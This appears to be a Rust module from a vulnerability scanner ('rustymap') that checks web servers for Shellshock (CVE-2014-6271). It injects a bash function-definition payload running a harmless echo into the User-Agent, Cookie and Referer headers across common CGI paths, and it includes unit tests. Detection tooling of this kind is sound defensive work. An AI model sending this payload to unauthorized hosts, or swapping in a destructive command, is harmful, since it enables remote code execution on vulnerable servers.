//! Shellshock (CVE-2014-6271) probe.
//!
//! Sends an exploit payload in HTTP header positions a vulnerable
//! bash-CGI host would pass through as environment variables:
//!
//!   `User-Agent: () { :;}; echo; echo; /bin/echo <TOKEN>`
//!   `Cookie:     () { :;}; echo; echo; /bin/echo <TOKEN>`
//!   `Referer:    () { :;}; echo; echo; /bin/echo <TOKEN>`
//!
//! A bash older than 4.3-patch25 with a CGI in the path interprets
//! the function definition, runs `echo <TOKEN>`, and the token leaks
//! into the response body — most often in the headers / body of the
//! 500-class response. We look for the token verbatim.
//!
//! Targets a list of common CGI prefixes. Read-only — `echo` is the
//! only command issued. The token is randomised so cached responses
//! can't cause false positives.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellshockFinding {
    pub url: String,
    pub vulnerable_paths: Vec<String>,
    pub probe_token: String,
}

const CGI_PATHS: &[&str] = &[
    "/cgi-bin/",
    "/cgi-bin/test.cgi",
    "/cgi-bin/test.sh",
    "/cgi-bin/test-cgi",
    "/cgi-bin/printenv",
    "/cgi-sys/",
    "/cgi-sys/entropysearch.cgi",
    "/cgi-mod/",
    "/scripts/",
    "/",
];

pub async fn probe(base_url: &str, dur: Duration) -> Result<ShellshockFinding> {
    let client = reqwest::Client::builder()
        .timeout(dur)
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (rustymap shellshock probe)")
        .redirect(reqwest::redirect::Policy::none())
        .build()?;

    let token = format!("rmss{}", rand_token());
    let payload = format!("() {{ :;}}; echo; echo; /bin/echo {}", token);

    let base = base_url.trim_end_matches('/').to_string();
    let mut hits: Vec<String> = Vec::new();

    for path in CGI_PATHS {
        let url = if path.is_empty() || *path == "/" {
            format!("{}/", base)
        } else {
            format!("{}{}", base, path)
        };
        // Send the payload in multiple header positions — different
        // hosts forward different headers to the CGI environment.
        let resp = client
            .get(&url)
            .header("User-Agent", &payload)
            .header("Cookie", &payload)
            .header("Referer", &payload)
            .send()
            .await;
        let Ok(resp) = resp else { continue };
        let headers_str = resp
            .headers()
            .iter()
            .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
            .collect::<Vec<_>>()
            .join("\n");
        let body = resp.text().await.unwrap_or_default();
        if body.contains(&token) || headers_str.contains(&token) {
            hits.push(url);
        }
    }

    Ok(ShellshockFinding {
        url: base,
        vulnerable_paths: hits,
        probe_token: token,
    })
}

fn rand_token() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let n = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("{:x}", n & 0xffffff)
}

pub fn print_finding(f: &ShellshockFinding) {
    use colored::*;
    println!();
    if f.vulnerable_paths.is_empty() {
        println!(
            "{}",
            format!("Shellshock probe on {} — no vulnerable CGI detected", f.url)
                .green()
        );
        return;
    }
    println!(
        "{}",
        format!("Shellshock on {} — {} path(s) execute injected echo!", f.url, f.vulnerable_paths.len())
            .red()
            .bold()
    );
    println!("  probe token: {}", f.probe_token);
    for p in &f.vulnerable_paths {
        println!("  · {} → command execution", p.red());
    }
    println!("  {}", "CVE-2014-6271 — patch bash to 4.3-patch25 or later".yellow());
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finding_serializes_round_trip() {
        let f = ShellshockFinding {
            url: "http://x.test".into(),
            vulnerable_paths: vec!["/cgi-bin/test".into()],
            probe_token: "rmss1234".into(),
        };
        let s = serde_json::to_string(&f).unwrap();
        let back: ShellshockFinding = serde_json::from_str(&s).unwrap();
        assert_eq!(back.vulnerable_paths.len(), 1);
        assert_eq!(back.probe_token, "rmss1234");
    }

    #[test]
    fn cgi_paths_list_covers_common_layouts() {
        for p in ["/cgi-bin/", "/cgi-sys/", "/cgi-mod/", "/scripts/"] {
            assert!(CGI_PATHS.iter().any(|x| *x == p), "missing {}", p);
        }
    }

    #[test]
    fn rand_token_is_hex_short() {
        let t = rand_token();
        assert!(t.len() <= 6);
        assert!(t.chars().all(|c| c.is_ascii_hexdigit()));
    }
}
